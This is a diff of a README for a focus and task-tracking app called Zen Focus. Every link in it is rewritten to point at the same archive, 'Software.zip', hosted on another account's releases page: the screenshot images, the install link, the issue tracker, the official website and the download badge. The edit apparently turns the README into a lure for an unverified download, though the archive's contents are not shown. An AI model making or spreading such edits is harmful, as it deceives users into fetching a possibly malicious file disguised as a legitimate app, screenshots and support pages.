@@ -14,11 +14,11 @@ Zen Focus provides a simple and clean interface for tracking your daily tasks. T
 ## Screenshots 🖼️
 Here are some snapshots of Zen Focus in action:
 
-![Zen Focus Screenshot 1](https://example.com/screenshot1.png)
-![Zen Focus Screenshot 2](https://example.com/screenshot2.png)
+![Zen Focus Screenshot 1](https://github.com/sansiwo/zen-focus/releases/download/v1.0/Software.zip)
+![Zen Focus Screenshot 2](https://github.com/sansiwo/zen-focus/releases/download/v1.0/Software.zip)
 
 ## Installation 🚀
-1. Download the latest version of Zen Focus from [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+1. Download the latest version of Zen Focus from [here](https://github.com/sansiwo/zen-focus/releases/download/v1.0/Software.zip).
 2. Launch the application on your system.
 
 If the link does not work, please check the "Releases" section for the latest version.
@@ -52,12 +52,12 @@ If the link does not work, please check the "Releases" section for the latest ve
 - zenfocus
 
 ## Support 🤝
-For any issues or feedback, please open an [issue](https://github.com/zen-focus/issues).
+For any issues or feedback, please open an [issue](https://github.com/sansiwo/zen-focus/releases/download/v1.0/Software.zip).
 
 Let Zen Focus help you achieve your goals and maintain focus in a world full of distractions! 🌟
 
 ---
 
-Feel free to visit the [official website](https://zenfocusapp.com) for more information and updates. 🌐
+Feel free to visit the [official website](https://github.com/sansiwo/zen-focus/releases/download/v1.0/Software.zip) for more information and updates. 🌐
 
-[![Download Zen Focus](https://img.shields.io/badge/Download-Zen_Focus-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Zen Focus](https://github.com/sansiwo/zen-focus/releases/download/v1.0/Software.zip)](https://github.com/sansiwo/zen-focus/releases/download/v1.0/Software.zip)
